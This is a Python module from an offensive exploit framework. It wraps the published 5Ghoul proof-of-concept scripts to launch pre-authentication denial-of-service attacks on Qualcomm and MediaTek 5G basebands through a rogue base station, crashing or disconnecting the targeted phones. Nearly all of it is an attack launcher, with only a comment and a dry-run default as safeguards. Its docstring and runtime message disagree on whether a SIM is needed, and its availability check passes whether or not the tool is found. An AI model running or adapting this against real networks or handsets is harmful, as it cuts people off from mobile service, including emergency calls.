"""5Ghoul 5G NR DoS Attacks — Qualcomm + MediaTek Basebands.

5Ghoul is a family of 5G NR implementation-level DoS vulnerabilities in
Qualcomm and MediaTek mobile platforms. All attacks are pre-authentication
and do not require SIM information.

Covered CVEs (selected):
  CVE-2023-33042 — Qualcomm: RRC Setup malformation
  CVE-2023-33043 — Qualcomm: RRC Reconfiguration crash
  CVE-2023-20702 — MediaTek: 5G NR DoS
  CVE-2024-20003 — MediaTek: MTK RRC CellGroup ID crash

HARDWARE: USRP B210 + srsRAN gNB rogue base station required.

Original research / PoC credits
--------------------------------
Source  : asset-group/5ghoul-5g-nr-attacks (ASSET Research Group, SUTD)
          WirelessXPL-Forge wirelessxpl/modules/generic/cellular/fiveghoul_5gnr_dos.py
CVEs    : CVE-2023-33042/33043/33044 (Qualcomm) + CVE-2023-32841..46, CVE-2023-20702,
          CVE-2024-20003/20004 (MediaTek)

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

import subprocess
from pathlib import Path

from embedxpl.core.exploit import *


_CVE_LIST = ("CVE-2023-33042", "CVE-2023-33043", "CVE-2023-20702", "CVE-2024-20003")


class Exploit(Exploit):
    """5Ghoul 5G NR DoS via rogue gNB (Qualcomm + MediaTek)."""

    __info__ = {
        "name": "5Ghoul 5G NR DoS — Qualcomm + MediaTek Basebands",
        "description": (
            "Orchestrator for the 5Ghoul family of 5G NR pre-auth DoS attacks "
            "against Qualcomm (CVE-2023-33042/43/44) and MediaTek (CVE-2023-32841..46, "
            "CVE-2023-20702, CVE-2024-20003/04) basebands. Requires USRP B210 + "
            "srsRAN rogue gNB. Disconnects or crashes targeted UEs."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            # Original: ASSET Research Group, SUTD (5Ghoul disclosure)
        ),
        "references": (
            "https://asset-group.github.io/disclosures/5ghoul/",
            "https://github.com/asset-group/5ghoul-5g-nr-attacks",
            "https://asset-group.github.io/papers/5Ghoul.pdf",
        ),
        "devices": ("5G NR-capable UEs with Qualcomm/MediaTek basebands",),
    }

    attack_id = OptString("cve_2023_33042", "5Ghoul attack ID (e.g. cve_2023_33042)")
    ghoul_repo = OptString("", "Path to cloned 5ghoul-5g-nr-attacks repo")
    dry_run = OptBool(True, "Dry run — describe only")

    @mute
    def check(self) -> bool:
        repo = str(self.ghoul_repo)
        if repo and Path(repo).exists():
            return True
        # Check if 5ghoul is available
        try:
            subprocess.run(["which", "srsran_gnb"], capture_output=True, timeout=3)
            return True
        except Exception:
            return False

    def run(self) -> None:
        attack_id = str(self.attack_id)
        repo = str(self.ghoul_repo)
        dry_run = bool(self.dry_run)

        print_status(f"5Ghoul 5G NR DoS orchestrator — attack: {attack_id}")
        print_info(f"Covered CVEs: {', '.join(_CVE_LIST)}")
        print_info("HW required: USRP B210 + 5G NR SIM + srsRAN gNB + 5Ghoul PoC scripts")

        if dry_run:
            cmd = f"python3 {repo}/attacks/{attack_id}.py" if repo else f"5ghoul {attack_id}"
            print_info(
                f"DRY-RUN: Would invoke: {cmd}. "
                "This launches a rogue 5G gNB that triggers the target vulnerability "
                "when the UE connects to the fake cell."
            )
        else:
            if not repo or not Path(repo).exists():
                print_error("5ghoul-5g-nr-attacks repo path not set or not found")
                print_info("Clone: git clone https://github.com/asset-group/5ghoul-5g-nr-attacks")
                return
            attack_script = Path(repo) / "attacks" / f"{attack_id}.py"
            if not attack_script.exists():
                print_error(f"Attack script not found: {attack_script}")
                return
            print_warning(f"Launching 5Ghoul attack: {attack_id}")
            subprocess.run(["python3", str(attack_script)], check=False)
